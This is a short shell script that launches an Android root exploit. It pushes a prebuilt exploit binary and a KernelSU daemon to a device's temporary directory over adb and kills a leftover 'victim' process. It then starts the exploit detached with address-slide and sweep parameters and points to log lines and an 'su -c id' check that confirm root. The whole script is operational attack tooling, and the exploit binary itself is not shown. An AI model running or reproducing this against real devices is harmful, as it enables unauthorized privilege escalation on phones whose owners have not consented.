#!/usr/bin/env sh
# Push + launch the exploit, then point at the verification command.
# Run ONCE per fresh boot.
#
#   ADB="/path/to/adb" sh run.sh
set -e

ADB="${ADB:-adb}"
TMP=/data/local/tmp
DELTA="${DELTA:-0x28000000}"
SWEEPSTART="${SWEEPSTART:-25}"

[ -f slide_dev ] || { echo "error: ./slide_dev not found; run ./build.sh first" >&2; exit 1; }

"$ADB" push slide_dev "$TMP/slide_dev"
[ -f ksu/ksud ] && "$ADB" push ksu/ksud "$TMP/ksud" || true
"$ADB" shell "chmod 755 $TMP/slide_dev $TMP/ksud 2>/dev/null; true"

# kill leftover victim (comm zf9m0001), then launch detached
"$ADB" shell "pkill -9 zf9m0001 2>/dev/null; cd $TMP && \
  nohup ./slide_dev $DELTA persist noslide neutral sweep 64 sweepstart=$SWEEPSTART ownprobe shortseq >> v.log 2>&1 & \
  echo launch-ok"

echo
echo "launched. wait ~3-4 min, then:"
echo "  $ADB shell \"grep -aE 'ROOT euid|seq result' $TMP/v.log\""
echo "  $ADB shell su -c id"
